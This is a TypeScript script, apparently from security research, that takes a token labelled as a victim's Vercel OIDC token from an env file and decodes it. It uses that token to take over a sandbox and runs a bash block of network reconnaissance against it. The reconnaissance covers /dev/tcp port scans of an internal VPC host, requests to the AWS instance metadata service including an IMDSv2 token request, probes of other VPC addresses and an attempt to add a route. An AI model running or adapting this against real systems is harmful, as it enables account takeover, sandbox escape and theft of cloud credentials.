import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== 1. host VPC IP 172.31.16.7 reachable? (from DNS earlier) ==="
for p in 22 80 443 2375 2379 6443 10250 8080 3000 9090 9100 53 22 8000; do
  timeout 1 bash -c "echo > /dev/tcp/172.31.16.7/$p" 2>/dev/null && echo "HOST-172.31.16.7 OPEN $p" || true
done
echo "--- ping 172.31.16.7 ---"
timeout 2 ping -c 1 -W 1 172.31.16.7 2>&1 | tail -2
echo "=== 2. AWS IMDS 169.254.169.254 under allow-all ==="
timeout 3 curl -s -o /tmp/m -w "code=%{http_code}\\n" --max-time 2 http://169.254.169.254/latest/meta-data/instance-id 2>&1 | tail -1
head -c 200 /tmp/m 2>/dev/null; echo ""
echo "--- IMDSv2 token ---"
timeout 3 curl -s -o /tmp/t -w "code=%{http_code}\\n" --max-time 2 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>&1 | tail -1
head -c 100 /tmp/t 2>/dev/null; echo ""
echo "=== 3. other VPC hosts reachable? (ARP scan 172.31.0.0/16 via gateway?) ==="
timeout 3 curl -s -o /dev/null -w "172.31.0.2:80 code=%{http_code}\\n" --max-time 2 http://172.31.0.2/ 2>&1 | tail -1
timeout 3 curl -s -o /dev/null -w "172.31.0.2:443 code=%{http_code}\\n" --max-time 2 https://172.31.0.2/ 2>&1 | tail -1
echo "=== 4. route table ==="
ip route 2>&1
echo "=== 5. can we add route to 172.31.0.0/16 via gateway? (unprivileged attempt) ==="
ip route add 172.31.0.0/16 via 100.64.0.1 2>&1 | head -2
timeout 2 ping -c 1 -W 1 172.31.16.7 2>&1 | tail -2
echo "=== 6. AWS metadata endpoint on 172.31.0.2? ==="
timeout 2 curl -s -o /dev/null -w "code=%{http_code}\\n" --max-time 1.5 http://172.31.0.2/latest/meta-data/ 2>&1 | tail -1
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
